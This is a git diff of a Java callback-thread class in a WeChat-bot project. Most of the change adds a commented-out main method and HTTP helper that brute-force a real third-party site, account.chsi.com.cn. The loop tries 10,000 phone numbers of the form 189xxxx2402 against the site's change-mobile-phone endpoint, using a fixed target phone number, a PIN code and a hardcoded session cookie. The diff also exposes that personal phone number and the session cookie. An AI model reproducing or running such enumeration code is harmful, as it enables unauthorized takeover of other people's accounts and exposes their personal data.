@@ -1,15 +1,19 @@
 package com.bootdo.common.TreadPool;
 
+import com.alibaba.fastjson.JSONObject;
 import com.bootdo.common.enums.EnumParseRecordDetailType;
 import com.bootdo.common.enums.EnumWxCmdType;
+import com.bootdo.common.utils.JSONUtils;
 import com.bootdo.common.utils.ShiroUtils;
 import com.bootdo.common.utils.SpringContextHolder;
+import com.bootdo.util.HxHttpClient;
 import com.bootdo.wx.domain.ParseRecordDO;
 import com.bootdo.wx.domain.ParseRecordDetailDO;
 import com.bootdo.wx.service.ParseRecordDetailService;
 import com.bootdo.wx.service.ParseRecordService;
 import com.bootdo.wx.service.impl.ParseRecordDetailServiceImpl;
 import com.google.common.collect.Lists;
+import com.google.common.collect.Maps;
 import com.wx.demo.common.SpringUtil;
 import com.wx.demo.frameWork.protocol.CommonApi;
 import com.wx.demo.frameWork.protocol.WechatServiceGrpc;
@@ -18,14 +22,24 @@ import com.wx.demo.tools.StringUtil;
 import com.wx.demo.wechatapi.model.ModelReturn;
 import com.wx.demo.wechatapi.model.WechatApi;
 import org.apache.commons.lang3.StringUtils;
+import org.apache.http.Header;
+import org.apache.http.HttpResponse;
+import org.apache.http.HttpStatus;
+import org.apache.http.NameValuePair;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.config.RequestConfig;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClientBuilder;
+import org.apache.http.message.BasicNameValuePair;
+import org.apache.http.util.EntityUtils;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
 
-import java.util.Date;
-import java.util.List;
-import java.util.Map;
-import java.util.UUID;
+import java.io.IOException;
+import java.util.*;
 
 /**
  * @author chenbo-QQ381756915
@@ -129,30 +143,90 @@ public class CallBackTread implements Runnable {
 
 //    public static void main(String[] args) {
 //        Map<String,String> noticeParam = Maps.newHashMap();
-//        noticeParam.put("appId","1");
-//        noticeParam.put("partnerId" , "1");
-//        noticeParam.put("apiVersion" , "1.0");
-//        noticeParam.put("returnType",SinaCallbackEnum.WITHDRAW.getCode());
-//        noticeParam.put("userId" , "6222550006109001");
-//        noticeParam.put("orderId" , "111111111111");
-//        noticeParam.put("code" , "S");
-//        noticeParam.put("desc" , "成功");
+//        noticeParam.put("mphoneareaold","0086");
+//        noticeParam.put("mphonearea" , "0086");
+//        noticeParam.put("mphone","18003711149");
+//        noticeParam.put("validateType" , "1");
+//        noticeParam.put("pincode" , "731692");
+//        noticeParam.put("newbuttonmp" , "确定");
 //
-//        // 参数排序
-//        LinkedHashMap<String, Object> linkedMap = StringUtils.mapSortByKey(noticeParam);
-//        //把参数加密md5
-//        String md5= MD5(Md5Utils.appendParam(linkedMap)).toLowerCase();
-//        noticeParam.put("md5Sign",md5);
+//        String borrowCallbackUrl="https://account.chsi.com.cn/account/domodifymobilephone.action";
 //
-//        String borrowCallbackUrl="http://58.250.250.46:9999/suixdCallBack";
 //        try {
-//            System.out.println(JSONObject.toJSON(noticeParam));
-//            String response=HttpClientUtils.postFormBytes(borrowCallbackUrl,JSONObject.toJSON(noticeParam).toString(),null, 2000, 10000);
 //
+//            for (int i = 0; i<9999;i++) {
+//                String str = "189"+String.format("%04d", i)+"2402";
+//                noticeParam.put("oldMobilePhone" , str);
+//                String response=post(borrowCallbackUrl, noticeParam);
+//            }
 //
-//            System.out.println(response);
+////            System.out.println(JSONObject.toJSON(noticeParam));
+////            System.out.println(response);
 //        } catch (Exception e) {
 //            e.printStackTrace();
 //        }
+//    }
+//
+//
+//    /**
+//     * 表单方式请求
+//     * @param url            请求的全路径 例如：http://localhost:8088/json.html
+//     * @param postParameters 使用post的方式请求的参数，此参数为一个map
+//     * @return 返回json字符串
+//     */
+//    public static String post(String url, Map<String, String> postParameters) {
+//        String returnStr = "";
+//        CloseableHttpClient httpClient = HttpClientBuilder.create().build();
+//        try {
+//            HttpPost httpPost = new HttpPost(url);
+//            /**
+//             * setConnectTimeout(20000)：设置连接超时时间，单位毫秒。
+//             * setConnectionRequestTimeout(20000) 设置从connect Manager获取Connection 超时时间，单位毫秒。这个属性是新加的属性，因为目前版本是可以共享连接池的
+//             * setSocketTimeout(20000) 请求获取数据的超时时间，单位毫秒。 如果访问一个接口，多少时间内无法返回数据，就直接放弃此次调用。
+//             */
+//            RequestConfig requestConfig = RequestConfig.custom().setSocketTimeout(20000).setConnectionRequestTimeout(20000).setConnectTimeout(20000).build();//设置请求和传输超时时间
+//            httpPost.setConfig(requestConfig);
+//            httpPost.setHeader("Content-Type", "application/x-www-form-urlencoded");
+//            httpPost.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
+//            httpPost.setHeader("Accept-Encoding", "gzip, deflate, br");
+//            httpPost.setHeader("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
+//            httpPost.setHeader("Cache-Control", "max-age=0");
+//            httpPost.setHeader("Connection", "keep-alive");
+//            httpPost.setHeader("Cookie", "JSESSIONID=F7D950CA38448E35E01F5016C13F50B6; Secure; _ga=GA1.3.115431369.1551964763; _gid=GA1.3.1675008777.1553140025; aliyungf_tc=AQAAAFGxVEu3EwAADArDt+6x87vfVSsm; acw_tc=276082a815531400420232991ebdf77d9378e2409b8edb56f6f098813cb8a3; __utmc=39553075; __utmz=39553075.1553140043.2.2.utmcsr=my.chsi.com.cn|utmccn=(referral)|utmcmd=referral|utmcct=/archive/index.jsp; _ga=GA1.4.115431369.1551964763; _gid=GA1.4.1675008777.1553140025; __utma=39553075.115431369.1551964763.1553140043.1553144276.3");
+//            httpPost.setHeader("Host", "account.chsi.com.cn");
+//            httpPost.setHeader("Origin", "https://account.chsi.com.cn");
+//            httpPost.setHeader("Referer", "https://account.chsi.com.cn/account/domodifymobilephone.action");
+//            httpPost.setHeader("Upgrade-Insecure-Requests", "1");
+//            httpPost.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36");
+//            /*
+//             * 解析传递过来的map参数，将参数解析为键值对(f=xxx)的格式放入到List
+//             */
+//            List<NameValuePair> nvps = new ArrayList<NameValuePair>();
+//            Set<String> keySet = postParameters.keySet();
+//            for (String key : keySet) {
+//                nvps.add(new BasicNameValuePair(key, postParameters.get(key)));
+//            }
+//            // 此处设置请求参数的编码为 utf-8
+//            httpPost.setEntity(new UrlEncodedFormEntity(nvps, "utf-8"));
+//            HttpResponse response = httpClient.execute(httpPost);
+//            /*
+//             * 判断HTTP的返回状态码，如果正确继续解析返回的数据
+//             */
+//            if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {//HttpStatus.SC_OK=200
+//                returnStr = EntityUtils.toString(response.getEntity());
+//            } else {
+//                returnStr = "{\"code\":\"500\",\"msg\":\"请求地址异常("+response.getStatusLine().getStatusCode()+")\",\"content\":\"\",\"extendData\":\"\"}";
+//                logger.info(">>>>>>>httpClient Post 请求地址异常---》url:" + url+",data:"+ JSONUtils.beanToJson(postParameters));
+//            }
+//        } catch (ClientProtocolException e) {
+//            logger.error(">>>>>>>httpClient Post ClientProtocolException 异常---》" + e.getMessage());
+//            returnStr = "{\"code\":\"601\",\"msg\":\"请求地址异常\",\"content\":\"\",\"extendData\":\"\"}";
+//            logger.info(">>>>>>>httpClient Post ClientProtocolException 异常---》url:" + url+",data:"+JSONUtils.beanToJson(postParameters));
+//        } catch (IOException e) {
+//            logger.error(">>>>>>>httpClient Post IOException 异常---》" + e.getMessage());
+//            returnStr = "{\"code\":\"602\",\"msg\":\"IO异常\",\"content\":\"\",\"extendData\":\"\"}";
+//            logger.info(">>>>>>>httpClient Post IOException 异常---》url:" + url+",data:"+JSONUtils.beanToJson(postParameters));
+//        }
+//        return returnStr;
 //    }
 }
